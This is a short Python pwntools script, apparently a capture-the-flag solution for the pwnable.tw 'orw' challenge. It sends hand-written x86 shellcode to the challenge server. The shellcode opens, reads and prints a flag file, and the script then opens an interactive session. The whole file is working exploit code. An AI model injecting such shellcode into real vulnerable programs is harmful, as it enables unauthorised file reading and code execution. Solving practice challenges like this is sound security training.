from pwn import *

p = remote('chall.pwnable.tw',10001)
print(p.recv())

shellcode = asm(
    """
    xor eax, eax
    push eax
    add eax, 5
    push 0x67616C66
    push 0x2f77726f
    push 0x2f656d6f
    push 0x682f2f2f
    mov ebx, esp
    mov edx, 0
    mov ecx, 0
    int 0x80

    mov eax, 3
    mov ecx, ebx
    mov ebx, eax
    mov edx, 38
    int 0x80

    mov eax, 4
    mov ebx, 1
    int 0x80
    """
)

p.send(shellcode)
res = p.recv()
print(res)
p.interactive()